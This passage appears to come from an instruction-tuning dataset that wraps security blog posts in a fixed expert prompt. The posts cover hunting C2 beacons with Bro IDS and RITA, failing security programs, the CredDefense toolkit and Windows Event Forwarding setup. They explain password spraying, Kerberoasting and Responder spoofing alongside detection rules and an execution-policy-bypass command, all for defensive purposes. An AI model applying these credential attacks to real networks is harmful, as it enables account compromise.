hopes that you can sift through the data in order to find the infection Bro-Cut Learning how to use tools like grep cut and awk makes this problem tractable However Bro IDS also includes a python tool called bro-cut Similar to dnscat2 we are looking for long connections Bro-cut allows us to throw away the fields we aren't interested in cat conn.log bro-cut uid id.orig_h id.resp_h duration sort -nr -k4 head -n 5 will display the top 5 connections by duration From here we grab the UID of the top connection and grep out the full connection details For me the top connection is labeled CFRuW5gJrBirOIYZ4 and I run grep CFRuW5gJrBirOIYZ4 conn.log Your UID may be different After running a whois search on the destination we see that the IP address is part of the Amazon EC2 cloud While I conducted this capture in EC2 it should be clear that long connections to cloud services should be immediately suspect Grep cut awk bro-cut sort head tail and the rest of the standard nix utilities are essential for making use of the logs produced by Bro IDS in the real world Other Logs The Meterpreter packet capture is a bit dirty While this makes finding the discussed infection a bit harder it demonstrates some of Bro's more advanced capabilities The http log shows the results of upgrading a host's APT package manager and installing Elinks a console based web browser The software log boils this information down and tells us that 10.200.201.29 ran several versions of APT in addition to the ELinks web browser Over time the known_hosts log and known_services log can be used in conjunction with the software log in order to build up an inventory of a tapped network Beyond these files Bro IDS offers a multitude of interesting monitoring capabilities including full file captures blacklist analyses and more Hunting With Robots RITA Hunting through logs by hand takes time and practice However software has been developed to address this problem Rather than stringing along a variety of nix commands across a slew of terminals we can use software to direct our search Enter RITA Real Intelligence Threat Analytics Don't We All RITA reads logs produced by Bro IDS and extracts as many interesting features from the dataset as possible RITA finds dnscat2 by spotting long-lasting connections as well as by counting subdomains Additionally RITA has a special beaconing module which uses advanced techniques from frequency analysis in order to find beaconing hosts Powershell Empire and other beaconing software is easily spotted after running RITA Meterpreter is no different RITA is able to see through the camouflage and show you the target In order to get started with RITA head over to our project page and install the program alongside John Alternatively visit the GitHub page and follow the instructions listed there In short Spin up an instance of Ubuntu 16.04 or similar Install git if it isn't installed sudo apt install git Clone RITA git clone ithub.com ocmdev rita.git Run the installer chmod x install.sh sudo install.sh Source your .bashrc source .bashrc Move the Bro logs from earlier to your RITA system if they are not there Start MongoDB sudo systemctl start mongod In the top level directory containing the three sample folders run rita import -i meterpreter folder -d Meterpreter rita import -i ps-empire folder -d Powershell-Empire rita import -i dnscat2 folder -d DNSCat2 Analyze the ingested data rita analyze Create the report rita html-report Finally open the file in a web browser rita-html-report index.html You should see the following display To begin with open up Meterpreter and click on long connections at the top Here you will see the results we found earlier with bro-cut Next open up Powershell-Empire and click on the beacons tab RITA clearly shows the beacon The field TS score stands for the timestamp score meaning that based on the connection timestamps there was a perfect beacon from 10.200.201.29 to 18.220.208.40 This beacon occurred most frequently at 5-second intervals and beaconed 652 times Finally go to the dnscat2 results and click on DNS Here we can see that there were 4 850 subdomains of sirknightthe.chickenkiller.com that were queried In addition if you go to the long connections tab you will see the same results from earlier Currently RITA does not alert on anything Rather it is to be used as an assistant a tactical tool In addition to the analyses we discussed earlier RITA performs blacklist checks network scan detection long URL analysis and analysis of user-agent strings Going forward RITA will be a testbed for a multitude of other analyses replacing the searches we normally do by hand Hacking Leaves Tracks Now We Can Follow Them Hackers may try to cover their tracks but inevitably Bro IDS will record their movements The beauty of Bro IDS is that it just needs a network tap It can run on an entirely separate network Unless a hacker gains physical control of the system they will not defeat Bro However Bro is not a cure-all It simply produces too much data Any signs of hacking are mixed and muddled with everyday traffic Bro IDS is able to produce terabytes of data Yet in order to extract value out of it we need to either invest hundreds of man-hours in manual analysis or in automation Our hope is that RITA will solve this problem and aid you in your hunts to come Dropbox Links Dnscat2 Command and control using DNS queries ww.dropbox.com s izmku9nqysjiwq0 dnscat2.pcap.gz?dl 0 Powershell Empire Command and control using HTTPS connections ww.dropbox.com s gdlnfwj6qeiz2cf ps-empire.pcap.gz?dl 0 Meterpreter Command and control using TCP connections ww.dropbox.com s f7653izqksr12of meterpreter.pcap.gz?dl 0"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Five Signs Your Organization Is Failing at Security</title>\n<taxonomies>InfoSec 101, Executive Leadership Team, Industry, infosec, security</taxonomies>\n<creation_date>Mon, 18 Sep 2017 15:50:51 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "1iJax aka The Security Viking Just when you think the drum has been beaten loudly enough for long enough a quick survey of organizations across the spectrum will find many companies still just don't get it No this is not an exhaustive list there is only so much we can fit on one post If you're an executive or member of management and you're having trouble getting a security program going or you really have no clue if you have an effective program please read on If you're a Security Pro that feels something isn't right at your organization and every step forward is met with one or more steps backward in your program then there is a good chance that the org is systematically failing 1 Management Has No Clear Idea What Security Is This is a pretty big one just about any other sign mentioned below is a symptom We need to discuss it and Management needs to understand it so that we can be level set on the rest of the signs What is the purpose of security If the first answer that came to your head was duh...protect the company I can't fault you for thinking that but it's wrong It is actually the executives in any organization whose job it is to protect the company not the rank and file members of Security So what is Security's job I won't bore you with some acronym At a very high level it is two simple things Well it sounds simple but anyone that studies game theory will tell you that the simpler the rules the more complex the game Advise upper management of the threats the organization is facing Oversight of the program upper management has tasked to counter those threats That's it Some Security folks may be screaming at the screen when I say this Who's this Viking guy Security is way more complicated than that and I go home each day and tell myself how proud I am that I protected that company Sure we use all sorts of processes methods and tools for our security programs but at the end of the day all of those things are just details that support our mission of Advising and Overseeing I did say simple rules make complex games Companies that fail to recognize this usually fail hard They are easily identified by their lack of strategy and oh boy just wait to see how they respond to a breach...welcome to the shit-show Executives in these Orgs will sound clueless when trying to describe the kind of program they have I worked at a multi-billion dollar company that recently had doubled in size During a town hall meeting with the CEO and COO I asked a simple question With the increase in size and the multiple verticals we are in has anyone started discussions around appointing a CISO I wasn't asking them if they had a CISO in mind I was just simply asking if the discussion had started The first sign something was wrong was when the Executive VP head of HR asked back What is a CISO We'll take this moment to pause and allow the security guys to finish laughing The world is full of acronyms and not everybody can pull from memory every acronym they have heard so I simply explained those terms and expanded on my question a little to give more context A few minutes passed and the CEO said We have a question 'With the increase in size and the multiple verticals we are in has anyone started discussions around appointing a CISO or CSO What happened next made me wish I had never asked The CEO responded I think we have people that are responsible for that so no next question Did I expect them to tip their hand and detail how they are strategically building the Security team to the whole world No but at a minimum at least pretend to care and give an answer that sounds like the thought of security had crossed their mind Instead we got an answer that clearly came from an Executive that didn't get it and had been insulated by many layers from Security Right around that time when I asked the question they moved the head of InfoSec another layer lower than the CIO and started the destruction of that team Which brings us to our next point 2 Improper reporting structure To report to the CIO or not report to the CIO is NOT the question Pundits have gone back and forth on the question To whom does InfoSec report As the grip of technology has deepened it has often become the practice to shuffle these teams under the CIO The problem with this approach at the risk of oversimplifying things IT exists to serve the technological wants and dreams of the business The security practitioner's job is advice and oversight gasp and requires telling people no No is an impossible word for the CIO use it too much and they won't be CIO for long They can say Yes but Yes but we need more money Yes but we need more headcount etc Can you imagine a CIO saying No we can't build that app to better engage our customers and make more money Neither can I The CIO that got stuck with security can quickly become a filter stifling our purpose of Advice and Oversight Hey they're just trying to guide the tech ship and some jerk that fancies himself a Viking keeps telling the IT guys they can't use TLS 1.0 God forbid if an inexperienced CIO shuffles security under another layer of IT management Try it if you really want to see the wheels fall off To be fair to the CIO CISO's that stonewall the business don't remain CISO's for long either We are in the Risk Mitigation business where sometimes battles are chosen carefully and political capital is stored for use at a later date Who should we report to then Some say CFO some COO Chief General Counsel...etc Some have even proposed that IT should actually report to a CISO It sounds interesting but you still end up with someone that has two roles with occasional competing interests To simplify this question first understand that reporting structure directly impacts 1 Advise upper management of the threats the organization is facing Oversight of the program upper management has tasked to counter those threats In order for Security to fulfill its purpose it MUST report directly to a member of the Executive Leadership Team The vertical your company is in may dictate which member of the ELT that is At the end of the day though it really doesn't matter which C suite person you report to so long as that person has a seat at the table and takes security seriously Anything less is just pretending and results in a game of telephone as each layer of management interprets what Security means 3 Policies Are Not Owned By Executives You would think that this would be obvious unfortunately this is not always the case I worked at a shop where the CIO insisted they get to review policies we proposed before legal did Of course Security reported to that CIO so that much of our work was met with all sorts of stonewalling and watering down The phrase of the day was We need to keep these close so we can remain fluid and adaptable to the business...blah blah blah Basically they liked being in control of the Security policy so it could be changed as needed to enable saying Yes to the business without adding to the workload Remember IT can't say no Drawing from our expanded knowledge of the simple purpose of Security might be a theme here this problem directly impacts Security's ability to provide oversight Executive Leadership MUST own the directives that dictate the direction the Security program is running Policies are the rules by which all employees must operate Without Executive sign-off any manager of equal or greater rank than the top Infosec manager can simply interpret what that policy means as they see fit Yes Security gets that there is a difference between attainable and aspirational policies We might advise against it we might ask But shouldn't we aspire to be more secure We wouldn't be good advisors if we simply bent the direction the wind blew but we also get that policies that you cannot hope to meet are unworkable for everyone involved This is why we need the ELT you know the folks responsible for protecting the company to weigh these decisions carefully and agree on the direction forward Everything we do every process every wall we build is a direct result of Policy Only when the ELT owns and feels comfortable defending these tough decisions can Security effectively move forward If you haven't caught on yet most of the signs of a failing InfoSec program come directly from Upper Management's lack of engagement Back while studying for a certain cert I had the privilege to get some training from someone that wrote a really popular study guide I'm quoting from memory so this is probably off the mark she essentially said If Security at your organization does not directly report to the ELT and the ELT or board doesn't sign off on policy you will not succeed If that organization is unwilling to change you need to run away and don't look back Sorry if I butchered this quote RIP Shon Harris...f cancer 4 Security has no idea what the purpose of security is This one made me laugh as I typed but sadly this is becoming more and truer Simply put security resources continue to get stretched thin and there are a whole lot of folks with only a couple years experience running around with senior titles In my day at 42 I'm an old curmudgeon in the industry I had to work eight years before I got a senior title Unfortunately it's the nature of the business now double digit unemployment rates in the field have led to an explosion of newbies from poorly planned infosec college programs and from IT The influx of IT folks I'm speaking mostly towards the management side is bringing an IT mentality with them Nothing wrong with IT folks coming over we love to have you please send more developers this way What used to be a slow trickle of highly qualified IT people learning the ropes from knowledgeable Security staff has quickly become the blind leading the blind Newly minted IT managers in Security will often times filter or even completely withhold the results of an honest attempt to evaluate the company's readiness level This natural reaction towards not wanting to look bad to senior management is a glaring violation of the purpose of Security I've heard things like There's too much red no way management will take us seriously or I can't give them this it makes us look really bad And even worse I need you to look closely and see if you can change of few of those things Dear former IT manager now in Security we need to have a talk We need you to stop capitulating You need to understand that the place to politicise a report is not in the findings it is in your management response I get it it's hard to show our warts Nobody is asking you to wear a tinfoil hat and scream that the sky is falling but when you shirk your duty to advise you are missing your chance to show them how they can get better and losing the respect of your staff in the process As a manager don't you agree that your usefulness to upper management is your ability to provide a vision for the future This is your time to shine and sell that vision 5 Revolving Door of Security staff Do people seem to come and go Do most of the analysts and engineers on your team have less than five years with the company Does your program seem to be on track for a couple of years and then everyone vanishes overnight If you answered yes to any of these then you've got a problem With some regions reporting unemployment numbers as low as -16 in InfoSec fields your staff will quickly learn they don't have to wait for you to figure it out So how do we fix it First you need to understand the type of staff that became Security folks in the first place They absolutely read between all the lines These are the people that crawl through all your systems and pick apart every nuance looking for threats to your organization do you not think they are reading your every move and weighing your words They know when they are being talked down too They know when management is not taking Security seriously If you don't care then why should they These folks are constantly under the gun They often times stay up at night just learning about the latest and greatest problems in the world They live breathe and eat from the seedy underbelly of the internet and many of them do take protecting the company personally even when we know we shouldn't Appreciation for the work security does is helpful but straight talk goes even further Be honest about your shortcomings as a company don't try to wash over them with some pretty facade We have highly attuned b.s meters Following through with the suggestions Security gives you to fix these shortcomings goes a long way Signaling to your security staff that the org is ready to try to fix things can have a huge impact on morale Now you're talking the talk how do we walk it Three words Security Staffing Standard Having a written plan for addressing staffing issues tells your experienced staff that management recognizes the need for a healthy program and gives you something you can manage towards No two companies have the same staffing needs and nobody has come up with the perfect formula Personally when it comes to the number of folks in the technology side of Security I like to use the Ratio of IT measure as a starting place A detailed look at this may be a post for another day but basically being at 6-8 of IT staff allocated to Security is about the middle of the pack Obviously the verticals you are in and some specialty skill sets can influence this number Know your business adjust accordingly and be prepared to adapt and change that Standard as the environments you operate in change Strong word of caution...Do not fall into the tool trap Buying a product does NOT replace a headcount in fact it may increase the need due to the specialty nature of managing that tool Tools are no different from hammers Hammers don't swing themselves My company has all these problems now what If you are C level and you did happen across my little rant the ball is in your court Own your policies enable Security by having them report directly to you staff accordingly and you will be light years ahead of the next guy For the Security guys even if your org hits all of these don't bail right away See it as a challenge do your best to fight the good fight and if you see no attempt to improve leave with a smile or just flat out run like Shon suggested You survived you learned and you can take all that knowledge of what doesn't work and help an org that really really really wants and needs your help I'll leave you especially our InfoSec brothers and sisters at Equifax a favorite proverb of mine that I passed to a Director at Target shortly after their breach Smooth seas do not make skillful sailors Good luck out there"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>The CredDefense Toolkit</title>\n<taxonomies>Author, Beau Bullock, Blue Team, Blue Team Tools, Brian Fehrman, Cred Defense Tool Kit, CredDefense, CredDefense Toolkit, event log consolidation, hardening accounts, kerberoasting, password auditing, password spraying, Pentesting, ResponderGuard</taxonomies>\n<creation_date>Wed, 27 Sep 2017 15:05:25 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Derek Banks Beau Bullock Brian Fehrman Our clients often ask how they could have detected and prevented the post-exploitation activities we used in their environment to gain elevated privileges and ultimately access sensitive data Most of the time this is achieved through credential abuse As pentesters the primary condition we take advantage of in credential abuse is poor passwords In any given environment with more than a few hundred end-users it is almost guaranteed that someone has chosen the season and year e.g Summer2017 as their password This makes it pretty easy to guess using a technique known as password spraying One way to fix this is to change the minimum password length for accounts but for reasons both technical and political this is not always possible for every environment to do this There are also a number of additional credential abuse attacks that take advantage of flaws in protocol implementation or default environment configuration such as with Kerberoasting and LLMNR Poisoning Wouldn't it be great if there was a free toolset to protect your credentials even when password length couldn't be changed and to alert on other credential attacks being conducted in your network That's why we created The CredDefense Toolkit to have a free way to detect and prevent credential abuse attacks Password Filter Windows domains enforce a standard set of complexity requirements on user passwords When a user attempts to set a new password the new password is checked against the requirements By default the following requirements are in place Eight-characters minimum Must contain three out of the four following Uppercase Letter Lowercase Letter Special Character Number Additionally users are required to set a new password every 90 days So what meets these requirements but is still easy for users to pick and remember Let's just say that most pentesters are very aware of the current season and the current year Fall2017 for instance How can you prevent users from picking these types of passwords Sure you can increase the minimum number of characters and enforce additional complexity We certainly have much less success password spraying in environments that require 15 characters or more We do however still run into users picking things like SummerSummmer2017 Additionally we understand the political backlash that can be associated with requiring that many characters There has to be another way...and there is Enter Windows Password Filtering The Windows Password Filter feature allows you to add additional checks when a user attempts to pick a new password The password first goes through the domain's password complexity check After passing the complexity check it then gets passed through your custom check You can have multiple checks if you'd like The image below shows the process How is this implemented The entire procedure is described here sdn.microsoft.com en-us library windows desktop ms721766 v vs.85 .aspx This can seem a bit tedious and overwhelming to do manually...which is why we have incorporated it into the Cred Defense interface Our work is based on this open-source project ithub.com jephthai OpenPasswordFilter If you open the Cred Defense tool select the Password Filter option You will then be asked if you'd like to Install Uninstall the feature or just update the password list that is used For Installing Uninstall you will be presented with two columns The program will grab down a list of all domain controllers in your environment It will then check each domain controller DC to see if it has the EasyPasswordFilter value in the HKLM System CurrentControlSet Control Lsa Notifications registry key If the key is not present it indicates that the DC is likely not running the password filter and the names of those DCs will be placed in the Unconfigured DCs column Selecting a DC name from the Unconfigured DCs list and clicking Install will Deploy the EasyPasswordFilter DLL to the SystemRoot Windows System32 directory on the target DC Deploy the password list to SystemRoot epf folder on the target DC Add the EasyPasswordFilter value to the HKLM System CurrentControlSet Control Lsa Notifications registry key on the target DC Ask you if you'd like to reboot the DC and then instruct the DC to restart if you choose to do so For uninstalling the program simply removes the EasyPasswordFilter value from the registry on the target DC and asks if you'd like to reboot the machine Pretty simple huh A few clicks and you're off and running How about updating the password list If you choose this option you will be shown a list of all of the DCs on which the password filter has been installed Click the Edit Passwords button and the list of passwords will be opened in Notepad.exe for you to edit Note that the password filter is set-up to be case-insensitive Additionally it will perform substring matching so that you don't have to type Winter2017 Winter2018 WinterWinter2017 etc and can instead just type winter There is also a safety-check in place that does not allow you to specify words that are less than four characters Once you're done editing the password list save the list and click the Deploy Updates button The password list will then be deployed to all of the DCs that are shown in the DC's Running Password Filter list This does not require you to restart the domain controllers Password Auditing Password filtering can be quite effective for preventing users from picking weak passwords What about current passwords in the environment How about Domain Admins reusing the same password for their normal user account Do you have passwords that don't expire How about user accounts that don't require a password Is the same password used for multiple administrative accounts All of these are very important questions that should be answered before threat actors find those answers The Password Auditing feature of the Cred Defense toolkit can make this process painless The work is based on the DSInternals toolkit ithub.com MichaelGrafnetter DSInternals First select the Password Auditing option from the main menu You will then be presented with a list of Domains within the current forest After selecting the domain you will be presented with a list of Domain Controllers within that domain After selecting a Domain Controller you will be asked to select a password list to use for the password-cracking portion of the audit You will also be asked to specify where you'd like the results to be saved After selecting the options click the Run Audit button and the process will be kicked off The program will leverage the AD Replication Sync feature to grab Active Directory information from the targeted DC The information is kept in memory and is not written to disk The program will perform multiple checks and output the results to the file specified Some of the checks include Password Reuse LanMan Hashes Admin Delegation No Password Password not Required Password doesn't Expire So how long does this take We ran this from a VM that was allocated 8 GB of RAM and 2 Cores It utilized the Human-Readable Crackstation password list The environment contained 3 Domain Controllers and over 30 000 unique user hashes The entire process completed in roughly 90 seconds Event Log Consolidation There are generally two categories of environments that we encounter on our engagements when it comes to logging The first is nothing is being logged and there is really no visibility into any information available that would help in detecting that malicious activity was occurring The second is that every log event is going into a SEIM and no one can effectively use it to discover or alert on anything useful If you are in either scenario setting up a more targeted approach to consolidating events from Windows Endpoints As part of the CredDefense toolkit we wrote this guide to setting up forwarding event logs to a central Windows Event Forwarding server Kerberoasting One of the first attacks we try when gaining a foothold in an environment is known as Kerberoasting The Microsoft implementation of Kerberos is complicated but the gist of the attack is that it takes advantage of legacy Active Directory support for older Windows clients and the type of encryption used and the key material used to encrypt and sign Kerberos tickets Essentially when a domain account is configured to run a service in the environment such as MS SQL a Service Principal Name SPN is used in the domain to associate the service with a login account When a user wishes to use the specific resource they receive a Kerberos ticket signed with NTLM hash of the account that is running the service This effectively allows any domain user to obtain a crackable hash for a service account on the network and often times a service account will have at least administrator on the local server where it runs The request for the Kerberos ticket generates Event 4769 on a domain controller in the environment With Windows Event Forwarder configured to consolidate event logs the Kerberos ticket requests are in one place to analyze An approach to detection is to create a HoneyAccount that will have a registered Service Principal Name and will not typically be requested by an end-user The Set-ADUser commandlet can be used for this just take care not to duplicate a valid SPN in your environment Set-ADUser honeytoken -ServicePrincipalNames Add MSSQLSvc server161 1433 Once the HoneyAccount has been created the CredDefenseEventParser PowerShell script can be used to parse the forwarded log to detect Event ID 4769 when the service account matches the HoneyToken value This would indicate that it is likely someone is Kerberoasting in the environment ResponderGuard One of the common attacks we as pentesters perform is to attempt NBNS or LLMNR spoofing attacks on a network in hopes of gaining hashed credentials of users One popular tool for performing this attack is called Responder written by Laurent Gaffie Another great tool for performing this attack is Inveigh by Kevin Robertson These tools can do a lot of awesome things but one of the primary functionalities is to function effectively as an NBNS or LLMNR spoofer It is common for us to be successful at obtaining hashed user credentials by using these tools So how does a defender go about detecting Responder-like activity on a large network There are a few tools that do detection of Responder on a LAN already out there But from what I can tell most are only able to check a single subnet due to how they are broadcasting an NBNS packet used Another option would be to send honey tokens to every system over SMB on the network but this method would require an attacker to actively crack an NTLMv2 hash and attempt to login prior to receiving an alert that Responder is on the network ResponderGuard is a PowerShell tool that should allow for the detection of Responder-like activity on a larger scale across networks It has the ability to locate Responder listeners on foreign subnets by sending targeted NBNS requests to every host in a list of CIDR ranges With each NBNS request a random hostname is requested for each IP address If a host responds that it is the correct host then it is likely that host is an NBNS spoofer To assist with alerting for this activity ResponderGuard writes a Windows event log immediately upon detecting a Responder-like listener on the network This can be utilized in association with CredDefense or any SIEM of your choice to alert you whenever a Responder-like system is discovered Just look for event ID 8415 In addition to alerting for Responder activity immediately ResponderGuard also has the ability to serve up honey credentials to the Responder listener This provides an additional detection mechanism if the attacker attempts to log in to a designated account In the screenshot below a defender has launched ResponderGuard and it is currently scanning the provided CIDR ranges It detected an NBNS response from the IP address at 192.168.0.18 for a random hostname An event was written to the event log and then a set of honey credentials HoneyDomain HoneyUser Summer2017 were submitted over SMB to the listener The screenshot below shows what the attacker would see in their Responder output First Responder reports that a poisoned answer was sent to 192.168.0.12 Our Windows server running ResponderGuard which is actually on a completely different subnet being NAT'd Next Responder received an SMB authentication request along with NTLMv2 hashed user credentials of our honey user How you set up these honey tokens could be done in a number of ways Some options will be discussed later on in this post To run ResponderGuard as a standalone script first download it from here Then start a new PowerShell process as an Administrator C powershell.exe -exec bypass Next import the ResponderGuard PowerShell script PS C Import-Module ResponderGuard.ps1 ResponderGuard can be run with or without generating event logs To write to the Windows Event log each time Responder is detected add the -LoggingEnabled flag to Invoke-ResponderGuard A list of CIDR ranges can be passed to Invoke-ReponderGuard with the -CidrList option If you would like to additionally submit a HoneyToken to Responder add the -HoneyTokenSeed option Make sure you manually change the honey token credentials in the script otherwise HoneyDomain HoneyToken will be submitted to Responder PS C Invoke-ResponderGuard -CidrList C temp cidr-list.txt -LoggingEnabled -HoneyTokenSeed This tool is very much still in development and more features are being worked on If you want to help out check out the open issues on the CredDefense repo Password Spraying Password spraying is an attack we use on almost every pentest due to how effective it can be in gathering credentials We've written about it a number of times Password spraying is an attack where basically the attacker generates a large list of usernames and submits one authentication attempt for each of them to avoid account lockout The password chosen is typically something commonly found to be used by users like 'SeasonYear for example 'Fall2017 or 'Companyname123 Password spraying can be performed against pretty much any authentication mechanism but we commonly target Active Directory related services It can be performed both internally and externally to most networks due to externally exposed web portals tied to Active Directory Some examples we commonly password spray externally are Outlook Web Access OWA ADFS Exchange Web Services EWS Office 365 or even VPN portals Internally a PowerShell tool we at Black Hills InfoSec wrote called DomainPasswordSpray works well for password spraying It generates a list of user accounts from the domain and attempts to remove anyone close to lockout already Additionally it enumerates Fine-Grained Password policies in order to avoid lockouts for accounts under different password policy restrictions Regardless of how password spraying is performed it will generate a large number of failed login events Many SIEM's and products alert for brute-forcing of account credentials on a network but most are just looking at a single user account's failed login attempts and missing password spraying due to the fact that it is one attempt for each account In order to help alert for password spraying CredDefense parses event logs looking for any individual IP address that generates more than ten failed login attempts in an hour The CredDefenseEventParser.ps1 script included in the repo can be run standalone or from CredDefense In addition to running in a loop looking at a given Windows Event log fil it can be directed at a specific event file evtx to perform analysis to hunt for password spraying events When run in a loop it will continually evaluate a given log file for events This could be your forwarded events log file where you are collecting the forwarded Windows Event logs from each system in your environment Conclusion The CredDefense Toolkit is meant to be a collection of tools and techniques that can be used to prevent and or detect many of the common attacks both pentesters and truly malicious individuals have success with The three of us working on this are red teamers at heart With CredDefense we are trying to make our lives harder by making it easier for organizations to detect the common attacks we have success with Oh and it is 100 free and open source Some things we've already included in CredDefense and discussed in this post are the following Domain Password Filter to hopefully prevent users from creating bad passwords in the first place Password doesn't Expire Kerberoast Detection Event Log Consolidation Using built-in Windows Event tools NBNS Spoofing Detection Honey Token Submission Responder-like systems Password Spraying Detection If you would like to hear more about CredDefense the video from our talk at DerbyCon 7.0 is available here ww.youtube.com watch?v 4u5gCoCu88Q We still have a number of other items we want to add in and are hopeful that we can get some community involvement in this project as well ___ Like what you see Check back soon for the webcast we'll be posting soon"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>End-Point Log Consolidation with Windows Event Forwarder</title>\n<taxonomies>Author, Blue Team, Blue Team Tools, Derek Banks, CredDefense, CredDefense Toolkid, End Point Log Consolidation, HoneyToken, kerberoasting, Pentesting, tool, WEF, Windows, Windows Event Forwarder</taxonomies>\n<creation_date>Wed, 27 Sep 2017 15:23:27 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Derek Banks I want to expand on our previous blog post on consolidated endpoint event logging and use Windows Event Forwarding and live off the Microsoft land for shipping events to a central location Why do this I wanted a Windows-based server with all of the event logs from the environment so that I could use PowerShell for analysis purposes Because then I could potentially just send the forwarded events to an upstream ELK server and visualization and have multiple options to work with the data This architecture then forms a part of the set-up needed for our CredDefense Toolkit Also there are some environments where deploying yet another agent to Windows endpoints may not be desirable WEF has been around for quite some time but many people do not realize that log consolidation capability is built into Windows and does not use an agent on the endpoint There were a few really good guides that already exist mentioned in the references links but they did not get me completely over the hump to getting WEF completely functional This is probably due to different releases Microsoft Server OSes Windows Server 2012 was used on the server-side for all of the lab systems and there was a mix of Windows 10 Enterprise and Pro and Windows 7 Pro for workstations Windows Event Forwarder Setup The first step is to stand up the collector server that will receive the logs from the rest of the windows systems in the environment The size of the system will be determined by your environment but we will not be sending every event so a modest server can be used and then sized up if requirements change First run the following commands on the collector server C winrm qc This starts the WinRM service and sets the service startup type to auto-start as well as configures a listener for the ports that send and receive WS-Management protocol messages Next use wecutil to configure the Windows Event Collector service and that it also starts when the system is rebooted C wecutil qc This will also result in a Service Principal Name being registered for Kerberos authentication If you are using an existing server and it has an HTTP SPN already registered WEF will not work unless you remove the existing one If you're using a new system you probably will not have to worry about it If during setup you are having issues and need to check SPN registration you can do so with setspn -t -q Create a Test Subscription on Collector server Create a domain security group for the endpoints that you wish to monitor and place the target systems in the group Alternatively you could just use Domain Computers if you are in a testing environment Otherwise using all computers in your environment to initially set up may not be the best idea Better to start smaller and work outwards than stumble out of the gate Once you work out what the target systems are on the collector server open Event Viewer and select the Subscriptions You will likely be prompted to start an auto-configure the Windows Collector service Select Yes Right-click on Subscriptions and select Create Subscription For the Subscription Name enter Security Log Cleared The Destination log should be Forwarded Events Select the radio button for Source computer initiated and select Select Computer Groups Add the target group that you will initially monitor Next select Select Events and the Event log drop-down choose the Security log For the purposes of this guide we will create one GPO that will contain all the settings for forwarding event logs for endpoint security analysis Additionally all domain member computers will be forwarding to the same WEF server Open the Group Policy Management panel and select your domain right-click and select Create a GPO in this domain and Link it here Type in a name such as Windows Event Forwarding and select OK Configure Event Log Forwarding Entry Under Computer Policies Admin Templates Windows Components Event Forwarding Right click on the Configure target Subscription Manager entry and select Edit Select the Enabled radio button and Show next to Subscription Managers in the Options pane Enter the following line in for the value substituting the Fully Qualified Domain name for the eventserver.domain.local portion of the URL below Server ventserver.domain.local 5985 wsman SubscriptionManager WEC Refresh 60 Note that this configuration is forwarding over HTTP rather than HTTPS The forwarded event traffic can be encrypted and use HTTPS if desired Turn on Windows Remote Management WS-Management Service via GPO The Windows Remote Management WS-Management service will need to be started on all the systems that will forward events Note that they do not need to be listening on HTTP or HTTPS the only system that needs that needs to be listening and have firewall rules configured is the WEF server To enable the Windows Remote Management to start on boot in the Group Policy Management Editor select Computer Configuration Preferences Control Panel Settings Services Then right-click in the services pane and select New Service In the startup field select Automatic Delayed Start and select the service name as WinRM also listed as Windows Remote Management WS-Management Leave the service action to Start Service Click Apply and OK Allow Local Network Service to Access Local Event Logs via GPO The local system that will be forwarding the logs to the central WEF server will need to have the Network Service account granted access to read event logs There is a built-in Windows group that comes in handy for this called Event Log Readers Under Computer Configuration Windows Settings Security Settings Restricted Groups right-click and select Add Group and type in Event Log Readers and select OK Right-click on the Event Log Readers group that you just added and select properties and add NETWORK SERVICE Click Apply and OK Sysmon GPO Microsoft's Sysmon is a tool released as part of the Sysinternals Suite It extends the endpoint's logging capability beyond the standard event logs Windows now can natively log the full command line of a process that executes but Sysmon provides additional data that can be very useful Hash of executed process Network Connections File creation time changes WMI filters and consumers On the local system it stores these logs in Event Viewer in Application and Services Logs Microsoft Windows Sysmon Operational By default Sysmon logging will create a fair amount of log noise This is why a configuration file should be used at install time to filter events at the endpoint that are known to be good or alert on specifically known bad This way you'll won't be shipping more than necessary to the central collector We recommend that you start with the excellent SwiftOnSecurity configuration file that can be found at their Github page From there you can add to the file what you need to further reduce noise in your environment One way to deal with Sysmon deployment is to create a startup script via GPO that runs a batch file to check to see if Sysmon is installed and if not install it with the correct configuration file If it is installed make sure the service is started A sample install script can be found here Make sure that the Sysmon executable the configuration file and the batch file are all in a common share We chose the SYSVOL share edit the script accordingly to your choice in your environment In the GPO Editor choose Computer Configuration Windows Settings Scripts Startup Shutdown and add in the install script PowerShell Script Block and Module Logging Leveraging PowerShell for attacks has become very popular with both pentesters and actual threat actors In the past PowerShell logging capabilities were lacking but that changed with PowerShell 5.0 This is the default version of Windows 10 so if you have migrated all Windows Endpoints from Windows 7 you're good to go At the time of this post most places have yet to move away completely from Windows 7 though If this is true for your environment you'll need to install Windows Management Framework 5.0 and turn on logging via GPO This task is left to the reader to figure out what best fits for their environment for software deployment After the install use the GPO editor to turn on Module and Script Block logging This is in Administrative Templates Windows Components Windows PowerShell Module logging will record pipeline execution details in Event ID 4103 and has details on scripts and formatted data from the output Script Block Logging will record code as it is executed by the PowerShell Engine therefore recording de-obfuscated code to event ID 4104 An additional caveat for Windows 7 systems is to download the Administrative Templates for Windows 10 and copy the 